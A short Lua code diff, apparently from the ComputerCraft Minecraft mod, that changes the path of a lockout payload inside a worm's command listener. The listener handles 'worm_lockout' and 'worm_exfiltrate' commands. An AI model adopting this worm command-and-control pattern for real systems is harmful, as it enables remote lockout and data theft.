@@ -56,8 +56,8 @@ local function listenLoop()
         if ch == COMMANDER_CHANNEL and type(msg) == "table" then
             if msg.type == "worm_lockout" then
                 -- Run lockout payload
-                if fs.exists("/payloads/lockout.lua") then
-                    shell.run("/payloads/lockout.lua", msg.name or "", msg.motto or "")
+                if fs.exists("/jnet/payloads/lockout.lua") then
+                    shell.run("/jnet/payloads/lockout.lua", msg.name or "", msg.motto or "")
                 end
             elseif msg.type == "worm_exfiltrate" then
                 -- Send config data back
